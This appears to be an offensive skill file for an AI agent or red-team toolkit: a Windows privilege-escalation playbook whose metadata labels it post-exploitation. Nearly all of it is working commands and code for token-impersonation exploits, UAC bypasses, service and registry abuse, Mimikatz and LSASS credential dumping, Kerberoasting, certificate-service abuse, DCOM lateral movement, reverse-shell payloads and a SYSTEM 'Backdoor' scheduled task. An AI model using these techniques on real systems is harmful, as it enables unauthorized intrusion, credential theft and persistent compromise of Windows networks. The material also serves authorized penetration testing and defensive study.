---
name: privesc-windows
description: Windows privilege escalation — token abuse, service exploitation, UAC bypass, credential harvesting, AD escalation paths
metadata:
  type: offensive
  phase: post-exploitation
  tools: winpeas, seatbelt, sharpup, rubeus, mimikatz, powerview, bloodhound
kill_chain:
  phase: [exploit, actions]
  step: [4, 7]
  attck_tactics: [TA0004]
depends_on: [network-attack, exploit-development]
feeds_into: [red-team-ops, advanced-redteam, active-directory-attack]
inputs: [shell_access, os_fingerprint]
outputs: [elevated_access, finding_record]
---

# Windows Privilege Escalation

## When to Activate

- Gained initial shell on Windows target, need SYSTEM/Admin
- Post-exploitation privilege escalation
- Active Directory privilege escalation
- UAC bypass scenarios

## Automated Enumeration

```powershell
# WinPEAS
.\winPEASx64.exe

# Seatbelt
.\Seatbelt.exe -group=all

# SharpUp
.\SharpUp.exe audit

# PowerUp
. .\PowerUp.ps1; Invoke-AllChecks
```

## Token Impersonation (SeImpersonatePrivilege)

```bash
# Check privileges
whoami /priv

# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege:
# Potato family exploits (NTLM relay to local SYSTEM)

# PrintSpoofer (Windows 10/Server 2016-2019)
PrintSpoofer.exe -i -c "cmd /c whoami"
PrintSpoofer.exe -c "C:\path\reverse_shell.exe"

# GodPotato (works on all Windows versions)
GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"

# SweetPotato
SweetPotato.exe -p C:\path\shell.exe
```

## Service Exploitation

```powershell
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
# If path has spaces and no quotes: place binary at first space

# Weak service permissions
# Check with accesschk:
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
# If SERVICE_CHANGE_CONFIG:
sc config VulnService binpath= "C:\path\shell.exe"
sc stop VulnService && sc start VulnService

# Writable service binary
icacls "C:\Program Files\Service\binary.exe"
# If writable: replace with malicious binary, restart service

# DLL hijacking
# Process Monitor: filter for NAME NOT FOUND on DLL loads
# Place malicious DLL in searched path before legitimate one
```

## Registry Exploits

```powershell
# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > shell.msi
msiexec /quiet /qn /i shell.msi

# AutoRun programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Check if any referenced binary is writable

# Stored credentials
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
cmdkey /list  # Stored Windows credentials
```

## UAC Bypass

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# Fodhelper bypass (Windows 10)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe

# Eventvwr bypass
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe

# CMSTPLUA COM object
# Requires: medium integrity, local admin group member
```

## Credential Harvesting

```powershell
# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:Administrator" "exit"

# SAM/SYSTEM backup
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# Offline: impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# DPAPI
mimikatz "dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\*"

# Cached credentials
mimikatz "lsadump::cache"

# Kerberos tickets
mimikatz "sekurlsa::tickets /export"
# Or Rubeus:
Rubeus.exe dump /nowrap
Rubeus.exe triage
```

## Scheduled Tasks

```powershell
# List tasks
schtasks /query /fo LIST /v | findstr /i "task\|run\|author"

# Check writable task binaries
# If task runs as SYSTEM with writable binary path:
# Replace binary → wait for execution

# Create task (if admin)
schtasks /create /tn "Backdoor" /tr "C:\path\shell.exe" /sc onlogon /ru SYSTEM
```

## Named Pipes & Impersonation

```powershell
# List named pipes
[System.IO.Directory]::GetFiles("\\.\pipe\")

# Create pipe server, wait for privileged client connection
# Impersonate connected client token
# Tools: PipeServerImpersonate, custom .NET
```

## AD-Specific Escalation

```powershell
# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt
hashcat -m 13100 hashes.txt wordlist.txt

# AS-REP Roasting
Rubeus.exe asreproast /outfile:asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt

# Constrained Delegation abuse
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target /ptt

# Resource-Based Constrained Delegation
# If GenericWrite on computer object:
# Add msDS-AllowedToActOnBehalfOfOtherIdentity
# Then S4U2Self + S4U2Proxy

# Shadow Credentials (if GenericWrite on user/computer)
Whisker.exe add /target:victim /domain:domain.com
Rubeus.exe asktgt /user:victim /certificate:cert.pfx /password:pass /ptt

# ADCS (Certificate Services)
Certify.exe find /vulnerable
Certify.exe request /ca:CA /template:VulnTemplate /altname:Administrator
```

## Advanced: Token Manipulation

### Token Impersonation Deep Dive
```c
// Windows tokens: Primary (process identity) vs Impersonation (thread identity)
// Impersonation levels: Anonymous < Identification < Impersonation < Delegation
// Need Impersonation or Delegation level to actually use the token

// Token theft from another process (requires SeDebugPrivilege):
HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
HANDLE hToken;
OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);
HANDLE hDupToken;
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);
CreateProcessWithTokenW(hDupToken, 0, L"cmd.exe", NULL, 0, NULL, NULL, &si, &pi);

// EfsPotato — abuse Encrypting File System for SYSTEM token
// CoercedPotato — consolidates multiple coercion techniques
// GodPotato — works across all Windows versions via DCOM
```

### Token Privilege Abuse
```powershell
# SeBackupPrivilege → read any file (bypass DACL)
robocopy /b C:\Windows\System32\config C:\temp SAM SYSTEM
# Then: impacket-secretsdump -sam sam -system system LOCAL

# SeRestorePrivilege → write any file (bypass DACL)
# Overwrite protected files, plant DLL for hijacking

# SeTakeOwnershipPrivilege → take ownership of any object
# Take ownership of HKLM\SYSTEM key → modify services

# SeLoadDriverPrivilege → load kernel driver (BYOVD)
# Load vulnerable signed driver → kernel R/W → SYSTEM

# SeManageVolumePrivilege → read raw disk
# Bypass file permissions by reading raw NTFS

# SeImpersonatePrivilege → Potato family exploits
# PrintSpoofer, GodPotato, JuicyPotatoNG, EfsPotato, CoercedPotato
```

### Named Pipe Impersonation
```c
// Create pipe → trick privileged service into connecting → impersonate
HANDLE hPipe = CreateNamedPipeA("\\\\.\\pipe\\evil",
    PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 1, 1024, 1024, 0, NULL);
ConnectNamedPipe(hPipe, NULL);
ImpersonateNamedPipeClient(hPipe);
// Now running as the connected client's identity
```

## Advanced: DPAPI Exploitation

```powershell
# DPAPI protects: browser passwords, WiFi keys, certificates, credential vault

# Find DPAPI blobs
dir /s /b C:\Users\*\AppData\Local\Microsoft\Credentials\*
dir /s /b C:\Users\*\AppData\Roaming\Microsoft\Protect\*  # Master keys

# Decrypt with Mimikatz
mimikatz # dpapi::masterkey /in:MASTER_KEY_FILE /rpc  # Uses DC to decrypt
mimikatz # dpapi::cred /in:CRED_BLOB  # Decrypt credential blob
mimikatz # dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect

# Domain DPAPI backup key (requires DA)
mimikatz # lsadump::backupkeys /system:DC_IP /export
# With backup key → decrypt ANY user's DPAPI blobs
```

## Advanced: COM Object Abuse

### UAC Bypass via COM
```powershell
# CMSTPLUA COM object (auto-elevate)
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("3E5FC7F9-9A51-4367-9063-A120244FBEC7"))
$com.ShellExec("cmd.exe", "/c whoami", "", "runas", 0)

# ICMLuaUtil COM object
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("D2E7025F-6BE0-4FBF-B128-10F02B5E3690"))
$com.ShellExec("C:\evil.exe", $null, $null, $null, 0)
```

### DCOM Lateral Movement
```powershell
# MMC20.Application (requires local admin on target)
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889"), "TARGET")
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c payload", "7")

# ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET"))
$com.item().Document.Application.ShellExecute("cmd.exe", "/c payload", "", $null, 0)
```

## Advanced: WSL & Hyper-V Escape

```bash
# WSL filesystem: C:\Users\USER\AppData\Local\Packages\...\LocalState\rootfs\
# From Windows: read WSL files (SSH keys, credentials)
# From WSL: access Windows at /mnt/c/ with same user privileges

# WSL as persistence:
# Scheduled task → wsl.exe -e bash -c "reverse_shell"
# WSL processes appear as wsl.exe → may bypass application control

# Hyper-V escape (rare, high-impact):
# CVE-2021-28476 (vmswitch RCE) — guest-to-host
# Requires: specific VM configuration + unpatched host
```

## Advanced: Credential Harvesting Techniques

### LSASS Dump Without Mimikatz
```powershell
# comsvcs.dll MiniDump (LOLBin — no external tools)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# ProcDump (Sysinternals — signed by Microsoft)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Task Manager (GUI — manual)
# Right-click lsass.exe → Create dump file

# Direct syscall dump (custom tool — avoids API hooks)
# Use NtReadVirtualMemory with direct syscall to read LSASS memory

# Silent Process Exit (abuse WER)
# Configure LSASS to dump on "exit" via registry
# Trigger: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe"

# Parse dump offline:
pypykatz lsa minidump lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
```

### SAM/SYSTEM Without Admin (Volume Shadow Copy)
```powershell
# If SeBackupPrivilege or access to shadow copies:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\

# Parse offline:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
